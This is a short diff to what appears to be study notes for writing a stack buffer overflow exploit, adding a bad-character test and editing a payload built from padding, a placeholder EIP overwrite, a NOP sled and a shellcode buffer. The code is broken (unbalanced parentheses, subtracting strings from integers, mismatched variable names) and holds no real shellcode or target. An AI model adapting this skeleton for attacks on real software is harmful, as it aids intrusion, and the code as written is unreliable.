@@ -40,6 +40,17 @@ pad = 'C'*(1000-111-4)
 
 inject = junk + eip + pad
 
+
+find_badchar
+***********
+
+bad_char = ''
+junk = 'A'*111
+other = '\x43'*(buff_size - junk - len(buff)
+
+inject = junk + bad_char + other
+
+
 write_shell
 ***********
 
@@ -49,7 +60,7 @@ buff_size = 5000
 junk = '\x41'*111
 eip = '\x11\x22\x33\x44'
 nops = '\x90'*20
-other = '\x43'*(buff_size - junk - eip -nops - len(buff)
+other = '\x43'*(buff_size - junk - eip -nops - len(buf)
 
 inject = junk + eip + nops + buf + other
 
